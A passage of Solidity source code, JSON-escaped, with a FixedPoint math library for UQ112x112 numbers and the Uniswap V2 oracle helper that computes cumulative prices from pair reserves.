constant RESOLUTION = 112;\r\n\r\n    // encode a uint112 as a UQ112x112\r\n    function encode(uint112 x) internal pure returns (uq112x112 memory) {\r\n        return uq112x112(uint224(x) \u003c\u003c RESOLUTION);\r\n    }\r\n\r\n    // encodes a uint144 as a UQ144x112\r\n    function encode144(uint144 x) internal pure returns (uq144x112 memory) {\r\n        return uq144x112(uint256(x) \u003c\u003c RESOLUTION);\r\n    }\r\n\r\n    // divide a UQ112x112 by a uint112, returning a UQ112x112\r\n    function div(uq112x112 memory self, uint112 x) internal pure returns (uq112x112 memory) {\r\n        require(x != 0, \u0027FixedPoint: DIV_BY_ZERO\u0027);\r\n        return uq112x112(self._x / uint224(x));\r\n    }\r\n\r\n    // multiply a UQ112x112 by a uint, returning a UQ144x112\r\n    // reverts on overflow\r\n    function mul(uq112x112 memory self, uint y) internal pure returns (uq144x112 memory) {\r\n        uint z;\r\n        require(y == 0 || (z = uint(self._x) * y) / y == uint(self._x), \"FixedPoint: MULTIPLICATION_OVERFLOW\");\r\n        return uq144x112(z);\r\n    }\r\n\r\n    // returns a UQ112x112 which represents the ratio of the numerator to the denominator\r\n    // equivalent to encode(numerator).div(denominator)\r\n    function fraction(uint112 numerator, uint112 denominator) internal pure returns (uq112x112 memory) {\r\n        require(denominator \u003e 0, \"FixedPoint: DIV_BY_ZERO\");\r\n        return uq112x112((uint224(numerator) \u003c\u003c RESOLUTION) / denominator);\r\n    }\r\n\r\n    // decode a UQ112x112 into a uint112 by truncating after the radix point\r\n    function decode(uq112x112 memory self) internal pure returns (uint112) {\r\n        return uint112(self._x \u003e\u003e RESOLUTION);\r\n    }\r\n\r\n    // decode a UQ144x112 into a uint144 by truncating after the radix point\r\n    function decode144(uq144x112 memory self) internal pure returns (uint144) {\r\n        return uint144(self._x \u003e\u003e RESOLUTION);\r\n    }\r\n}\r\n\r\n// library with helper methods for oracles that are concerned with computing average prices\r\nlibrary UniswapV2OracleLibrary {\r\n    using FixedPoint for *;\r\n\r\n    // helper function that returns the current block timestamp within the range of uint32, i.e. [0, 2**32 - 1]\r\n    function currentBlockTimestamp() internal view returns (uint32) {\r\n        return uint32(block.timestamp % 2 ** 32);\r\n    }\r\n\r\n    // produces the cumulative price using counterfactuals to save gas and avoid a call to sync.\r\n    function currentCumulativePrices(\r\n        address pair\r\n    ) internal view returns (uint price0Cumulative, uint price1Cumulative, uint32 blockTimestamp) {\r\n        blockTimestamp = currentBlockTimestamp();\r\n        price0Cumulative = IUniswapV2Pair(pair).price0CumulativeLast();\r\n        price1Cumulative = IUniswapV2Pair(pair).price1CumulativeLast();\r\n\r\n        // if time has elapsed since the last update on the pair, mock the accumulated price values\r\n        (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast) = IUniswapV2Pair(pair).getReserves();\r\n        if (blockTimestampLast != blockTimestamp) {\r\n            // subtraction overflow is desired\r\n            uint32 timeElapsed = blockTimestamp - blockTimestampLast;\r\n            // addition overflow is desired\r\n            // counterfactual\r\n            price0Cumulative += uint(FixedPoint.fraction(reserve1, reserve0)._x) * timeElapsed;\r\n            // counterfactual\r\n            price1Cumulative += uint(FixedPoint.fraction(reserve0, reserve1)._x) * timeElapsed;\r\n        }\r\n    }\r\n}"}}